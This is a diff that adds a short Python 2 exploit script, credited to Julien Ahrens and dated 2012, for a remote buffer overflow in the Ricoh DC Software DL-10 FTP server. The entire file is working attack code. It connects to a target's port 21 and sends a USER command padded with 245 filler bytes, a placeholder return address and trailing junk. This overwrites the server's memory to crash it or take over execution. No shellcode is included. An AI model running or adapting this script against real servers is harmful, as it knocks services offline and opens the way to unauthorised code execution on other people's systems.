@@ -1,0 +1,40 @@
+#!/usr/bin/python
+ 
+# Exploit Title: Ricoh DC Software DL-10 FTP Server (SR10.exe) <= 1.1.0.6 Remote Buffer Overflow Vulnerability
+# Version:       <= 1.1.0.6
+# Date:          2012-02-05
+# Author:        Julien Ahrens
+# Homepage:      www.inshell.net
+# Software Link: http://www.ricohpmmc.com
+# Tested on:     Windows XP SP3 Professional German
+# Notes:         Capftpd (former SR-10) is vulnerable too
+# Howto:         "Log file name" has to be set
+
+import socket,sys
+import os
+
+target="192.168.0.1"
+port=21
+
+junk1 = "\x41" * 245
+boom = "\x42\x42\x42\x42" 
+junk2 = "\x43" * 50
+
+payload = junk1 + boom + junk2
+
+print "[*] Connecting to Target " + target + "..."
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    connect=s.connect((target, port))
+    print "[*] Connected to " + target + "!"
+except:
+    print "[!] " + target + " didn't respond\n"
+    sys.exit(0)
+    
+s.recv(1024)
+print "[*] Sending malformed request..."
+s.send('USER ' + payload + '\r\n')
+
+print "[!] Exploit has been sent!\n"
+s.close()
